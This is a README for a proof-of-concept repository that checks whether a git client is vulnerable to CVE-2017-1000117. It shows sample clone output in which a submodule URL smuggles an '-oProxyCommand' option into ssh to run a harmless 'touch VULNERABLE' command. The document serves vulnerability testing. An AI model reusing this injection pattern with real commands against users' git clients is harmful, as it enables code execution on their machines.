CVE-2017-1000117
--

This module can be used to test whether you are vulnerable to CVE-2017-1000117
```
git clone https://github.com/timwr/CVE-2017-1000117.git --recurse-submodules
ls CVE-2017-1000117
```
Output if you are vulnerable:
```
$ git clone https://github.com/timwr/CVE-2017-1000117.git --recurse-submodules
Cloning into 'CVE-2017-1000117'...
remote: Counting objects: 4, done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0
Unpacking objects: 100% (4/4), done.
Submodule 'test' (ssh://-oProxyCommand=touch VULNERABLE/git@github.com:/timwr/test.git) registered for path 'test'
Cloning into './CVE-2017-1000117/test'...
Pseudo-terminal will not be allocated because stdin is not a terminal.
ssh_exchange_identification: Connection closed by remote host
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
fatal: clone of 'ssh://-oProxyCommand=touch VULNERABLE/git@github.com:/timwr/test.git' into submodule path './CVE-2017-1000117/test' failed
Failed to clone 'test'. Retry scheduled
Cloning into './CVE-2017-1000117/test'...
Pseudo-terminal will not be allocated because stdin is not a terminal.
ssh_exchange_identification: Connection closed by remote host
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
fatal: clone of 'ssh://-oProxyCommand=touch VULNERABLE/git@github.com:/timwr/test.git' into submodule path './CVE-2017-1000117/test' failed
Failed to clone 'test' a second time, aborting
$ ls CVE-2017-1000117
README.md  VULNERABLE
```

If you see VULNERABLE then you are vulnerable and need to update your git client

